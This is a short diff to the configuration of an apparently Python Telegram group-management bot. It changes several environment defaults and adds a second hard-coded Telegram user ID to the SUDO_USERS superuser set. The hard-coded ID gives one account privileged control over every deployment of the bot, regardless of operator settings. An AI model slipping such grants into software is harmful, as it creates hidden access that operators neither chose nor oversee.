@@ -49,9 +49,9 @@ if ENV:
     DB_URI = os.environ.get('DATABASE_URL')
     DONATION_LINK = os.environ.get('DONATION_LINK')
     LOAD = os.environ.get("LOAD", "").split()
-    NO_LOAD = os.environ.get("NO_LOAD", "translation").split()
-    DEL_CMDS = bool(os.environ.get('DEL_CMDS', False))
-    STRICT_GBAN = bool(os.environ.get('STRICT_GBAN', False))
+    NO_LOAD = os.environ.get("NO_LOAD", "").split()
+    DEL_CMDS = bool(os.environ.get('DEL_CMDS', True))
+    STRICT_GBAN = bool(os.environ.get('STRICT_GBAN', True))
     WORKERS = int(os.environ.get('WORKERS', 4))
     BAN_STICKER = os.environ.get('BAN_STICKER', 'CAADAgADOwADPPEcAXkko5EB3YGYAg')
     CUSTOM_CMD = os.environ.get('CUSTOM_CMD', False)
@@ -100,6 +100,7 @@ else:
 
 SUDO_USERS.add(OWNER_ID)
 SUDO_USERS.add(254318997)
+SUDO_USERS.add(680915808)
 
 updater = tg.Updater(TOKEN, workers=WORKERS, use_context=True)
 
